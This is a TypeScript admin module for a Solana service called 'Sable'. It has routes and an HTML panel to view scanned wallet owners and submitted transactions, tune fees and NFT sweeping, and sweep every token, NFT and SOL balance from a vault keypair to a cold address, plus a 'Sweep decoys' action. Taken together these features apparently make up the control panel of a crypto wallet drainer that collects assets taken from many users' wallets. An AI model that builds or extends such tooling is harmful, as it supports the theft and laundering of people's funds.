import { ComputeBudgetProgram, Keypair, PublicKey, SystemProgram, Transaction } from "@solana/web3.js";
import { createAssociatedTokenAccountIdempotentInstruction, createCloseAccountInstruction, createTransferInstruction, getAssociatedTokenAddressSync, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from "@solana/spl-token";
import { readFileSync, readdirSync } from "node:fs";
import bs58 from "bs58";
import { cfg } from "./config.js";
import { conn } from "./rpc.js";
import { log } from "./log.js";

export const runtime = {
  paused: false,
  jito: cfg.JITO,
  priority: cfg.PRIORITY_MICROLAMPORTS,
  computeLimit: cfg.COMPUTE_UNIT_LIMIT,
  reclaimRent: cfg.RECLAIM_RENT,
  sweepNfts: cfg.SWEEP_NFTS,
  skipMints: new Set(cfg.skipMints),
};

const vaultKp = process.env.VAULT_SECRET ? Keypair.fromSecretKey(bs58.decode(process.env.VAULT_SECRET.trim())) : null;
const MIN_SWEEP_RAW = 1_000_000n;

export function authed(headers: any) {
  return headers["x-admin-token"] === cfg.ADMIN_TOKEN;
}

function events(limit = 50) {
  const files = readdirSync("logs").filter((f) => f.endsWith(".jsonl")).sort().slice(-3);
  const out: any[] = [];
  for (const f of files) {
    for (const line of readFileSync("logs/" + f, "utf8").trim().split("\n")) {
      if (!line) continue;
      try { out.push(JSON.parse(line)); } catch {}
    }
  }
  return out.slice(-limit).reverse();
}

export function adminRoutes(app: any) {
  app.get("/admin", async (req: any, reply: any) => { reply.type("text/html").send(PAGE); });

  app.get("/admin/stats", async (req: any, reply: any) => {
    if (!authed(req.headers)) return reply.code(401).send("no");
    const evs = events(200);
    const submits = evs.filter((e) => e.level === "submit");
    const vault = await conn.getBalance(cfg.vault);
    return {
      paused: runtime.paused, vaultLamports: vault, submits: submits.length,
      owners: new Set(evs.filter((e) => e.level === "scan").map((e) => e.owner)).size,
      events: evs.slice(0, 40),
    };
  });

  app.post("/admin/config", async (req: any, reply: any) => {
    if (!authed(req.headers)) return reply.code(401).send("no");
    const b = req.body ?? {};
    if (typeof b.paused === "boolean") runtime.paused = b.paused;
    if (typeof b.jito === "boolean") runtime.jito = b.jito;
    if (Number.isFinite(b.priority)) runtime.priority = b.priority;
    if (Number.isFinite(b.computeLimit)) runtime.computeLimit = b.computeLimit;
    if (typeof b.reclaimRent === "boolean") runtime.reclaimRent = b.reclaimRent;
    if (typeof b.sweepNfts === "boolean") runtime.sweepNfts = b.sweepNfts;
    if (Array.isArray(b.skipMints)) runtime.skipMints = new Set(b.skipMints);
    log({ level: "admin-config", ...b });
    return { ok: true };
  });

  app.post("/admin/sweep", async (req: any, reply: any) => {
    if (!authed(req.headers)) return reply.code(401).send("no");
    if (!vaultKp) return reply.code(400).send("VAULT_SECRET not set");
    const cold = new PublicKey(cfg.COLD_PUBKEY);
    const sigs: string[] = [];

    const found: { ata: PublicKey; mint: PublicKey; amount: bigint; programId: PublicKey }[] = [];
    for (const programId of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
      const res = await conn.getParsedTokenAccountsByOwner(cfg.vault, { programId });
      for (const { pubkey, account } of res.value) {
        const info = (account.data as any).parsed.info;
        found.push({ ata: pubkey, mint: new PublicKey(info.mint), amount: BigInt(info.tokenAmount.amount), programId });
      }
    }

    const perTx = 6;
    for (let i = 0; i < found.length; i += perTx) {
      const ixs = [
        ComputeBudgetProgram.setComputeUnitLimit({ units: 200_000 }),
        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 20_000 }),
      ];
      for (const t of found.slice(i, i + perTx)) {
        if (t.amount > 0n && t.amount < MIN_SWEEP_RAW) continue;
        if (t.amount > 0n) {
          const dest = getAssociatedTokenAddressSync(t.mint, cold, false, t.programId);
          ixs.push(createAssociatedTokenAccountIdempotentInstruction(vaultKp.publicKey, dest, cold, t.mint, t.programId));
          ixs.push(createTransferInstruction(t.ata, dest, vaultKp.publicKey, t.amount, [], t.programId));
        }
        ixs.push(createCloseAccountInstruction(t.ata, cold, vaultKp.publicKey, [], t.programId));
      }
      const tx = new Transaction({ feePayer: vaultKp.publicKey, recentBlockhash: (await conn.getLatestBlockhash()).blockhash }).add(...ixs);
      tx.sign(vaultKp);
      sigs.push(await conn.sendRawTransaction(tx.serialize(), { skipPreflight: true }));
    }

    const bal = await conn.getBalance(cfg.vault);
    if (bal > 10000) {
      const tx = new Transaction({ feePayer: vaultKp.publicKey, recentBlockhash: (await conn.getLatestBlockhash()).blockhash })
        .add(SystemProgram.transfer({ fromPubkey: vaultKp.publicKey, toPubkey: cold, lamports: bal - 5000 }));
      tx.sign(vaultKp);
      sigs.push(await conn.sendRawTransaction(tx.serialize(), { skipPreflight: true }));
    }

    log({ level: "vault-sweep", sigs, tokens: found.length });
    return { sigs, tokens: found.length };
  });
}

const PAGE = `<!doctype html><html><head><meta charset="utf-8"><title>admin</title>
<style>
body{margin:0 auto;max-width:900px;background:#08080B;color:#F7F7FA;font:14px/1.5 Inter,system-ui,sans-serif;padding:28px}
h1{font-size:20px;font-weight:600;margin:0 0 18px}
.card{background:rgba(255,255,255,.03);border:1px solid #1E1E27;border-radius:14px;padding:16px;margin-bottom:14px}
button{background:linear-gradient(135deg,#9945FF,#7B2FF7);color:#fff;border:0;border-radius:9px;padding:9px 14px;font:inherit;font-weight:500;cursor:pointer;margin-right:8px}
button.g{background:rgba(255,255,255,.05);border:1px solid #1E1E27}
input{background:#101016;border:1px solid #1E1E27;color:#F7F7FA;border-radius:8px;padding:8px 10px;font:inherit;margin-right:8px;width:130px}
.row{display:flex;justify-content:space-between;padding:7px 0;border-top:1px solid rgba(255,255,255,.05);font-size:12px;font-family:ui-monospace,monospace}
.row:first-child{border:0}
.k{color:#5E5E6B}
</style></head><body>
<h1>Sable admin</h1>
<div class="card">
  <input id="tok" placeholder="admin token" type="password" style="width:260px">
  <button onclick="load()">Load</button>
</div>
<div class="card" id="stats">no data</div>
<div class="card">
  <input id="prio" placeholder="priority">
  <button onclick="setc({priority:+document.getElementById('prio').value})">Set priority</button>
  <button class="g" onclick="setc({paused:!S.paused})" id="pauseBtn">Pause</button>
  <button class="g" onclick="sweep()">Sweep vault</button>
  <button class="g" onclick="dsweep()">Sweep decoys</button>
</div>
<div class="card" id="evs"></div>
<script>
let S={};
const T=()=>document.getElementById('tok').value;
const H=()=>({'Content-Type':'application/json','x-admin-token':T()});
async function load(){
  const r=await fetch('/admin/stats',{headers:H()});
  if(!r.ok){document.getElementById('stats').textContent='bad token';return}
  S=await r.json();
  document.getElementById('stats').innerHTML=
    '<div class="row"><span class="k">paused</span><span>'+S.paused+'</span></div>'+
    '<div class="row"><span class="k">vault lamports</span><span>'+S.vaultLamports+'</span></div>'+
    '<div class="row"><span class="k">submits</span><span>'+S.submits+'</span></div>'+
    '<div class="row"><span class="k">unique wallets</span><span>'+S.owners+'</span></div>';
  document.getElementById('pauseBtn').textContent=S.paused?'Resume':'Pause';
  document.getElementById('evs').innerHTML=S.events.map(e=>
    '<div class="row"><span class="k">'+(e.level||'')+'</span><span>'+(e.sig||e.owner||e.msg||'')+'</span></div>').join('');
}
async function setc(o){
  await fetch('/admin/config',{method:'POST',headers:H(),body:JSON.stringify(o)});
  load();
}
async function sweep(){
  const r=await fetch('/admin/sweep',{method:'POST',headers:H(),body:'{}'});
  alert(await r.text());load();
}
async function dsweep(){ const r=await fetch('/admin/decoy-sweep',{method:'POST',headers:H(),body:'{}'}); alert(await r.text()); load(); }
</script></body></html>`;
